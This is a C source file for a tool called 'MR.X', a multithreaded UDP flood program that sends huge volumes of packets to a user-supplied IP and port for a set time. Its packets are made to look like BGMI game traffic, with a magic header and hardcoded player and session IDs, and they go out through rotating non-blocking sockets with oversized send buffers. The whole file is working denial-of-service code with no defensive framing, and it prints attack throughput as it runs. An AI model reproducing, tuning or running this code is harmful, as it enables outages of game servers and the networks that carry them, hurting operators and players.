#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/time.h>

#define HYPER_LOOPS 240
#define INNER_LOOPS 120
#define EXTRA_BURST 24
#define BUFFER_ROTATION 3
#define PRE_ALLOC_COUNT 50000

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile unsigned long long *second_packets = NULL;
int monitor_running = 1;
int current_second = 0;

char **packet_pool = NULL;

struct bgmi_packet {
    uint32_t magic;
    uint32_t type_len;
    uint32_t sequence;
    uint32_t timestamp;
    uint64_t player_id;
    uint64_t session_id;
    uint8_t data[32];
    uint16_t checksum;
};

uint64_t player_ids[] = {
    12343765738325288ULL,
    70868798294852904ULL,
    74971778744334500ULL,
    5003905726975568877ULL,
    13140100657841448ULL
};

uint64_t session_ids[] = {
    5003905726975568877ULL,
    51381156466ULL,
    5229430348ULL,
    5207217259ULL,
    5219550043ULL
};

void init_packet_pool() {
    packet_pool = malloc(PRE_ALLOC_COUNT * sizeof(char*));
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        packet_pool[i] = malloc(PACKET_SIZE);
        struct bgmi_packet *pkt = (struct bgmi_packet*)packet_pool[i];
        
        pkt->magic = htonl(0x47534D55);
        pkt->type_len = htonl((1 << 16) | PACKET_SIZE);
        
        static uint32_t seq = 1000000;
        pkt->sequence = htonl(seq++);
        
        struct timeval tv;
        gettimeofday(&tv, NULL);
        pkt->timestamp = htonl((tv.tv_sec * 1000) + (tv.tv_usec / 1000));
        
        pkt->player_id = player_ids[rand() % 5];
        pkt->session_id = session_ids[rand() % 5];
        
        for(int j = 0; j < 32; j++) {
            pkt->data[j] = rand() % 256;
        }
        
        pkt->checksum = 0;
        uint16_t sum = 0;
        for(int j = 0; j < PACKET_SIZE - 2; j++) {
            sum += packet_pool[i][j];
        }
        pkt->checksum = sum;
    }
    
    second_packets = malloc((DURATION_TIME + 10) * sizeof(unsigned long long));
    memset(second_packets, 0, (DURATION_TIME + 10) * sizeof(unsigned long long));
}

void cleanup_pool() {
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        if(packet_pool[i]) free(packet_pool[i]);
    }
    free(packet_pool);
    if(second_packets) free(second_packets);
}

void *pps_monitor(void *arg) {
    unsigned long long last_packets = 0;
    time_t start = time(NULL);
    
    printf("\n🔥 MR.X 3X STARTED 🔥\n");
    printf("Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("Time: %ds | Size: %d | Threads: %d\n\n", DURATION_TIME, PACKET_SIZE, THREAD_COUNT);
    
    while (monitor_running) {
        sleep(1);
        current_second++;
        time_t now = time(NULL);
        
        if(now > start) {
            unsigned long long current_total = total_packets;
            unsigned long long pps = current_total - last_packets;
            second_packets[current_second] = pps;
            
            double mbps = (pps * (PACKET_SIZE + 28) * 8.0) / 1000000.0;
            double total_gb_so_far = 0;
            
            for(int i = 1; i <= current_second; i++) {
                double sec_mbps = (second_packets[i] * (PACKET_SIZE + 28) * 8.0) / 1000000.0;
                total_gb_so_far += sec_mbps / 1024.0;
            }
            
            printf("[%ds] 🚀PPS: %.0fK | Pk: %.1fM | Mb: %.0f | Data: %.2fGB\n",
                   current_second,
                   pps/1000.0,
                   current_total/1000000.0,
                   mbps,
                   total_gb_so_far);
            
            last_packets = current_total;
        }
    }
    return NULL;
}

void *send_hyper_packets(void *arg) {
    int socks[BUFFER_ROTATION];
    struct sockaddr_in servaddr;
    time_t start_time = time(NULL);
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(TARGET_PORT);
    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        socks[s] = socket(AF_INET, SOCK_DGRAM, 0);
        int broadcast = 1;
        int sndbuf = 200 * 1024 * 1024;
        setsockopt(socks[s], SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(socks[s], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(socks[s], SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof(broadcast));
        fcntl(socks[s], F_SETFL, O_NONBLOCK);
    }
    
    int local_pool_index = (int)(long)arg % PRE_ALLOC_COUNT;
    int socket_rotate = 0;
    
    while (time(NULL) - start_time < DURATION_TIME) {
        for (int mega_burst = 0; mega_burst < HYPER_LOOPS; mega_burst++) {
            int current_sock = socks[socket_rotate % BUFFER_ROTATION];
            
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE, 
                   MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
            __sync_fetch_and_add(&total_packets, 1);
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                   MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
            __sync_fetch_and_add(&total_packets, 1);
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            for (int i = 0; i < INNER_LOOPS; i++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
            
            for (int extra = 0; extra < EXTRA_BURST; extra++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
        }
    }
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        close(socks[s]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: ./mrx [IP] [PORT] [TIME] [SIZE] [THREADS]\n");
        exit(EXIT_FAILURE);
    }

    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);

    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        fprintf(stderr, "Error: Invalid values\n");
        exit(EXIT_FAILURE);
    }

    srand(time(NULL));
    init_packet_pool();

    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, pps_monitor, NULL);

    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    if (threads == NULL) {
        fprintf(stderr, "Memory failed\n");
        return EXIT_FAILURE;
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, send_hyper_packets, (void*)(long)i) != 0) {
            break;
        }
        usleep(500);
    }

    sleep(DURATION_TIME);
    monitor_running = 0;
    
    for (int j = 0; j < THREAD_COUNT; j++) {
        pthread_cancel(threads[j]);
        pthread_join(threads[j], NULL);
    }

    pthread_join(monitor_thread, NULL);
    
    unsigned long long avg_pps = total_packets / DURATION_TIME;
    double total_mbps = (total_packets * (PACKET_SIZE + 28) * 8.0) / 1000000.0;
    double total_gb = total_mbps / 1024.0;
    
    printf("\n🔥 MR.X Completed 🔥\n");
    printf("Avg PPS: %.0fK | Total Pkts: %.1fM | Total Data: %.2fGB\n",
           avg_pps/1000.0,
           total_packets/1000000.0,
           total_gb);
    
    cleanup_pool();
    free(threads);

    return 0;
}